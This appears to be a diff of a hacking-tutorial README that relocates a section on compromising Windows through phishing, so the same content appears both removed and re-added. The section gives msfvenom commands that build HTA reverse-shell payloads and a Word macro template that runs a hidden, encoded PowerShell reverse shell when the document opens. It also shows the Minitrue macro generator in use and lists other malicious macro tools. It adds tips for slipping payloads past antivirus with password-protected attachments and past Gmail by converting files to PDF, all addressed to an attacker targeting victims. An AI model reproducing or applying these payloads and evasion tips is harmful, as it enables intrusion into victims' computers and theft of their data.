@@ -119,102 +119,6 @@ https://www.hackercoolmagazine.com/gophish-setup-a-phishing-campaign/
 ```
 # 
 #
-# How to Compromise Windows 🦋 system
-
-***You can add this payload to your phishing email. When the victim installs & open this malicious file, you'll get your shell 🐚***
-
-## HTA Attack in Action
-
-We will use msfvenom to turn our basic HTML Application into an attack, relying on the hta-psh output format to create an HTA payload based on PowerShell. 
-In Listing 11, the complete reverse shell payload is generated and saved into the file evil.hta.
-
-```
-msfvenom -p windows/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil.hta
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil64.hta
-```
-## Exploiting Microsoft Windows using MS Word Macro [ Manually ] 🐓
-The Microsoft Word macro may be one the oldest and best-known client-side software attack vectors.
-
-Microsoft Office applications like Word and Excel allow users to embed macros, a series of commands and instructions that are grouped together to accomplish a task programmatically. Organizations often use macros to manage dynamic content and link documents with external content. More interestingly, macros can be written from scratch in Visual Basic for Applications (VBA), which is a fully functional scripting language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications.
-```
-Create the .doc file
-Use the base64 powershell code from revshells.com
-```
-Used this code to inline macro(Paste the code from revshells in str variable) :
-```
-str = "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
-
-n = 50
-
-for i in range(0, len(str), n):
-    print "Str = Str + " + '"' + str[i:i+n] + '"'
-```
-```
-Sub AutoOpen()
-
-  MyMacro
-
-End Sub
-
-Sub Document_Open()
-
-  MyMacro
-
-End Sub
-
-Sub MyMacro()
-
-    Dim Str As String
-
-   <b>Paste the script output here!<b>
-
-    CreateObject("Wscript.Shell").Run Str
-
-End Sub
-```
-## Exploiting Microsoft Windows using MS Word Macro [Automation Script] 🪿
-If the thought of manually crafting a macro exploit seems feels like a headache then This tool simplifies the process, which automatically generate MW word macros which contain's your RCE payload code.
-
-***Minitrue***
-```
-git clone https://github.com/X0RW3LL/Minitrue.git
-```
-```
-cd /opt/WindowsMacros/Minitrue
-./minitrue
-select a payload: windows/x64/shell_reverse_tcp
-select the payload type: VBA Macro
-LHOST=$yourIP
-LPORT=$yourPort
-Payload encoder: None
-Select or enter file name (without extensions): hacker
-```
-# Malicious Macros Generators
-
-1) https://github.com/cldrn/macphish
-2) https://github.com/cedowens/Mythic-Macro-Generator
-   
-## Pro tip ♦️: 
-**You can put a password on your payload file to bypass Windows antivirus. 🔍**
-
-**When the victim receives your email containing an attachment, the attachment is a password-protected spreadsheet or MS Word file. Make sure you provide a password in your phishing email. When Your target downloads 📩 the file and then enters the password to open it . your malicious payload is executed on their computer!** 
-
-**because antivirus software is not able to scan your malicious file, as it is encrypted and password-protected.🔐** 
-Antiviruses are designed to scan for malicious behavior. Not to crack the password protected file, LoL.
-<div align="center">
-
-![1](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNTh2cWNwY2toOWg5cjBxbjFrM2RsNmtlcjZxdnhwY3B3bG52aW50dCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VLWIuR02bq33gp48aQ/giphy.gif)
-</div>
-
-## Disclaimer
-The files in this repository were created and modified by me,  for my own personal use and come with no guarantee to work for you. I provide these files "as-is" and offer no support whatsoever to get them working. A lot of these files use terrible formatted and layered tables, anyone working with email and newsletter designs knows how painful they can be, and how worse it is to reverse-engineer those.🦆 
-
-## How you Bypass Gmail macro restrictions
-You can bypass gmail scanning for potentially malicious macros by converting Microsoft Word (.docx) or Excel (.xlsx) files into PDF format before sending them via email. Then, you suggest informing the recipient (Target) to convert the file back to its original format in order to use it. 
-
-![IMG_20240217_110508](https://github.com/DevVj-1/Hacking-Social_Media-Accounts/assets/106962581/fa1a6ba9-63e2-4e7b-afe5-397e71985875)
-
-While PDF files are generally considered safer than Word or Excel files in terms of macro-based attacks, they are not immune to security risks. PDF files can contain other types of malicious content, such as embedded links or JavaScript-based attacks.
 
 ## OSINT (Open-source Intelligence)
 
@@ -358,7 +262,105 @@ This tool looks at things like plants, building styles, and weather in the pictu
 
 - **[MSF-Persistence-Backdoor](https://github.com/DevVj-1/Hacking-Social_Media-Accounts/blob/main/MSF-Persistence-Backdoor.md)**:
 - **[Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/)**: More Hacking Tricks and commands 👁️⃤
-  
+
+
+  # How to Compromise Windows 🦋 system
+
+***You can add this payload to your phishing email. When the victim installs & open this malicious file, you'll get your shell 🐚***
+
+## HTA Attack in Action
+
+We will use msfvenom to turn our basic HTML Application into an attack, relying on the hta-psh output format to create an HTA payload based on PowerShell. 
+In Listing 11, the complete reverse shell payload is generated and saved into the file evil.hta.
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil.hta
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil64.hta
+```
+## Exploiting Microsoft Windows using MS Word Macro [ Manually ] 🐓
+The Microsoft Word macro may be one the oldest and best-known client-side software attack vectors.
+
+Microsoft Office applications like Word and Excel allow users to embed macros, a series of commands and instructions that are grouped together to accomplish a task programmatically. Organizations often use macros to manage dynamic content and link documents with external content. More interestingly, macros can be written from scratch in Visual Basic for Applications (VBA), which is a fully functional scripting language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications.
+```
+Create the .doc file
+Use the base64 powershell code from revshells.com
+```
+Used this code to inline macro(Paste the code from revshells in str variable) :
+```
+str = "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
+
+n = 50
+
+for i in range(0, len(str), n):
+    print "Str = Str + " + '"' + str[i:i+n] + '"'
+```
+```
+Sub AutoOpen()
+
+  MyMacro
+
+End Sub
+
+Sub Document_Open()
+
+  MyMacro
+
+End Sub
+
+Sub MyMacro()
+
+    Dim Str As String
+
+   <b>Paste the script output here!<b>
+
+    CreateObject("Wscript.Shell").Run Str
+
+End Sub
+```
+## Exploiting Microsoft Windows using MS Word Macro [Automation Script] 🪿
+If the thought of manually crafting a macro exploit seems feels like a headache then This tool simplifies the process, which automatically generate MW word macros which contain's your RCE payload code.
+
+***Minitrue***
+```
+git clone https://github.com/X0RW3LL/Minitrue.git
+```
+```
+cd /opt/WindowsMacros/Minitrue
+./minitrue
+select a payload: windows/x64/shell_reverse_tcp
+select the payload type: VBA Macro
+LHOST=$yourIP
+LPORT=$yourPort
+Payload encoder: None
+Select or enter file name (without extensions): hacker
+```
+# Malicious Macros Generators
+
+1) https://github.com/cldrn/macphish
+2) https://github.com/cedowens/Mythic-Macro-Generator
+   
+## Pro tip ♦️: 
+**You can put a password on your payload file to bypass Windows antivirus. 🔍**
+
+**When the victim receives your email containing an attachment, the attachment is a password-protected spreadsheet or MS Word file. Make sure you provide a password in your phishing email. When Your target downloads 📩 the file and then enters the password to open it . your malicious payload is executed on their computer!** 
+
+**because antivirus software is not able to scan your malicious file, as it is encrypted and password-protected.🔐** 
+Antiviruses are designed to scan for malicious behavior. Not to crack the password protected file, LoL.
+<div align="center">
+
+![1](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNTh2cWNwY2toOWg5cjBxbjFrM2RsNmtlcjZxdnhwY3B3bG52aW50dCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VLWIuR02bq33gp48aQ/giphy.gif)
+</div>
+
+## Disclaimer
+The files in this repository were created and modified by me,  for my own personal use and come with no guarantee to work for you. I provide these files "as-is" and offer no support whatsoever to get them working. A lot of these files use terrible formatted and layered tables, anyone working with email and newsletter designs knows how painful they can be, and how worse it is to reverse-engineer those.🦆 
+
+## How you Bypass Gmail macro restrictions
+You can bypass gmail scanning for potentially malicious macros by converting Microsoft Word (.docx) or Excel (.xlsx) files into PDF format before sending them via email. Then, you suggest informing the recipient (Target) to convert the file back to its original format in order to use it. 
+
+![IMG_20240217_110508](https://github.com/DevVj-1/Hacking-Social_Media-Accounts/assets/106962581/fa1a6ba9-63e2-4e7b-afe5-397e71985875)
+
+While PDF files are generally considered safer than Word or Excel files in terms of macro-based attacks, they are not immune to security risks. PDF files can contain other types of malicious content, such as embedded links or JavaScript-based attacks.
+
 
 ![somthing](https://github.com/DevVj-1/Hacking-Social_Media-Accounts/assets/106962581/38160faf-3a18-48de-8f24-e0270ba70fa1)
 
